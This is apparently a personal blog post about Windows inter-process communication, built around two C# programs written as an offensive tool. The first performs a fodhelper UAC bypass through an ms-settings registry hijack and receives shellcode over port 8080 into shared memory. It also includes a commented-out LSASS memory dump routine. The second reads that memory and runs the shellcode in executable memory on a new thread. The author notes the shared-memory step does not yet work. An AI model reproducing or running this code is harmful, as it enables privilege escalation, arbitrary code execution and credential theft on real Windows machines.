# IPC via Memory Mapping and pipes

## What are pipes?

So there are 2 process with which you want to communicate with. For instance where you just want to send some stuff to another process pipes would be helpful. There are 2 kind of pipes. First one being anonymous pipes which can perform IPC on local machine and second one being named pipes for performing IPC over network. But since I was not able to find a way to execute stuff which making it visible to another process, I decided to look for something else!

## Shared Memory

Windows offer another way for IPC called shared memory files which seems a perfect choice for my problem statement. I can just create a shared memory region, pass my shellcode over that region and then use the elevated process to execute the shellcode.This seems easy, but after trying for 2-3 hrs I am not able to make the elevated process have access to shared memory region. So I am currently looking into access rights of shared memeory and maybe modifying those will let elevated process access it?


In case you are curious here is the code I am currently dealing with

- The below code is the main code which would do stuff and open port 8080 and once you send shellcode over 8080, it would create shared memory and write the shellcode on that.
```c#
using System;
using System.Management;
using System.IO;
using System.IO.Pipes;
using System.Diagnostics;
using System.Net.Sockets;
using System.Net;   
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO.MemoryMappedFiles;

class Program
{
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UInt64 dwSize, UInt64 flAllocationType, UInt64 flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr OpenProcess(UInt64 dwDesiredAccess, bool bInheritHandle, UInt64 dwProcessId);

    [DllImport("dbghelp")]
    private static extern bool MiniDumpWriteDump(IntPtr hProcess, UInt64 ProcessId, SafeHandle hFile, UInt64 dumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

    private static UInt64 DELTE = 0x10000;
    private static UInt64 READ_CONTROL = 0x20000;
    private static UInt64 WRITE_DAC = 0x40000;
    private static UInt64 WRITE_OWNER = 0x80000;
    private static UInt64 SYNCHRONIZE = 0x1000000;
    private static UInt64 END = 0xFFF;
    private static UInt64 PROCESS_ALL_ACCESS = (DELTE | READ_CONTROL | WRITE_DAC | WRITE_OWNER | SYNCHRONIZE | END);

    //Perform UAC bypass using fodhelper
    static void ByPassUAC(string command)
    {
        //UAC Bypass using fodhelper.exe
        //REG ADD HKCU\Software\Classes\ms - settings\Shell\Open\command
        //REG ADD HKCU\Software\Classes\ms - settings\Shell\Open\command / v DelegateExecute / t REG_SZ
        //REG ADD HKCU\Software\Classes\ms - settings\Shell\Open\command / d "cmd.exe" / f

        RegistryKey myKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
        if (myKey == null)
        {
            RegistryKey tmpKey = Registry.CurrentUser.CreateSubKey(@"Software\\Classes\\ms-settings\\shell\\open\\command");
            tmpKey.Close();
        }
        myKey.Close();
        RegistryKey Key = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings\\shell\\open\\command",true);
        Key.SetValue("DelegateExecute", "REG_SZ");
        Key.SetValue("", command);
        return;
    }

    //Start a fodhelper.exe process
    static Process ActivateProcess(string name)
    {
        Process p = new Process();
        p.StartInfo.CreateNoWindow = true;
        p.StartInfo.FileName = name;
        p.Start();
        return p;
    }

    static void ExecuteInProcess(Process client)
    {
        using(AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable))
        {
            client.StartInfo.Arguments = pipeServer.GetClientHandleAsString();
            client.StartInfo.UseShellExecute = false;
            
            client.Start();

            pipeServer.DisposeLocalCopyOfClientHandle();
        }
    }

    static void ReverShell(MemoryMappedFile mmf)
    {
        IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
        IPAddress ipAddress = ipHost.AddressList[1];
        IPEndPoint localEndpoint = new IPEndPoint(ipAddress, 8080);

        Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        s.Bind(localEndpoint);
        s.Listen(5);

        // Accept incomming connection
        Socket handler = s.Accept();
        byte[] bytes = new byte[1024];
        byte[] shellcode;

        //Save the incomming bytes to a byte array to execute
        while (true)
        {
            int bytesRec = handler.Receive(bytes);
            shellcode = new byte[bytesRec];
            Buffer.BlockCopy(bytes, 0, shellcode, 0, bytesRec);
            break;
        }

        MemoryMappedViewStream stream = mmf.CreateViewStream(0,shellcode.Length-1);
        stream.Seek(0, SeekOrigin.Begin);
        stream.WriteByte(Convert.ToByte(shellcode.Length - 1));
        stream.Seek(1, SeekOrigin.Begin);
        stream.Write(shellcode, 0, shellcode.Length-1);
        while (true) ;
    }

    //Return the process id the process spawned by running fodhelper.exe i.e the cmd.exe running with elevated privs.
    // Refer : https://stackoverflow.com/questions/17922725/monitor-child-processes-of-a-process
    static IntPtr GetChildProcess(Process parentProcess)
    {
        int i = 0;
        ManagementObjectSearcher mo = new ManagementObjectSearcher(String.Format("Select * from Win32_Process Where ParentProcessID={0}", parentProcess.Id));
        foreach(ManagementObject m in mo.Get()){
            i = Convert.ToInt32(m["ProcessID"]);
        }
        if (i == 0)
        {
            System.Console.WriteLine("[!] Error getting the child process handle");
            return IntPtr.Zero;
        }
        else
        {
            IntPtr child = OpenProcess(PROCESS_ALL_ACCESS, false, (UInt64)i);
            return child;
        }
    }

    static void WriteMem(Process p)
    {
        FileStream fs = new FileStream("lsass.dat", FileMode.Create);

        bool status = MiniDumpWriteDump(p.Handle, (UInt64)p.Id, fs.SafeFileHandle, (UInt64)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        if (status)
        {
            System.Console.WriteLine("Done!");
            fs.Close();
            System.Console.ReadLine();
        }
        else
        {
            System.Console.WriteLine("[!] Error dumping the process");
        }
        return;
    }

    static void Main(string[] args)
    {
        MemoryMappedFile mmf = MemoryMappedFile.CreateNew("shellcode", 500,MemoryMappedFileAccess.ReadWrite);
        ReverShell(mmf);
        MemoryMappedFileSecurity sec = mmf.GetAccessControl();
        ByPassUAC("C:\\Users\\root\\source\\repos\\Execute\\Execute\\bin\\x64\\Debug\\Execute.exe");
        Process p = ActivateProcess("C:\\Windows\\System32\\fodhelper.exe");
        IntPtr child_handle = GetChildProcess(p);
        Console.ReadLine();
//        WriteMem(p);
    }
}
```

- Below is code for the Execute.exe which would take the mapped memeory and execute stuff from that. Sadly, somehow it is not able to access the mapped memory.
Code:
```c#
using System;
using System.IO.MemoryMappedFiles;
using System.Runtime.InteropServices;

class Program
{

    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(UInt64 lpAddress, UInt64 dWsize, UInt64 flAllocationType, UInt64 flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt64 lpThreadAttributes, UInt64 dWsize, IntPtr lpStartAddress, IntPtr lpParameter, UInt64 dwCreationFlags, IntPtr lpThradId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt64 dwMilliSeconds);

    private static UInt64 MEM_COMMIT = 0x1000;
    private static UInt64 PAGE_EXECUTE_READWRITE = 0x40;

    public static void ExecuteShellcode(byte[] shellcode)
    {
        IntPtr address = VirtualAlloc(0, (UInt64)(shellcode.Length - 1), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, address, shellcode.Length - 1);
        IntPtr threadHandle = CreateThread(0, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);

    }
    static void Main(string[] args)
    {

        MemoryMappedFile mmf = MemoryMappedFile.OpenExisting("shellcode");
        MemoryMappedViewAccessor accessor = mmf.CreateViewAccessor();

        int length = accessor.ReadByte(1);
        byte[] shellcode = new byte[length];

        MemoryMappedViewStream stream = mmf.CreateViewStream(0, length);
        stream.Read(shellcode, 0, length);

        ExecuteShellcode(shellcode);
    }
}
```
